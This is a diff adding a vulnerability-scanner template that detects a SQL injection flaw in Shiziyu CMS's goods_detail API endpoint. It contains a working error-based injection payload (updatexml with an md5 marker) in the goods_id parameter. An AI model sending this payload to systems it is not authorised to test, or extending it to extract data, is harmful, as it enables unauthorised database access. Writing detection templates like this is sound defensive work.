@@ -1,0 +1,22 @@
+id: shiziyu-cms-apicontroller-sqli
+brief:
+    title: Shiziyu CMS Api Controller - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: Shiziyu CMS ApiController.class.php parameter filtering is not rigorous, resulting in SQL injection vulnerability.
+    label:
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)'
+      signs:
+        - "on": word
+          has:
+            - c8c605999f3d8352d7bb792cf3fdb25
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 404
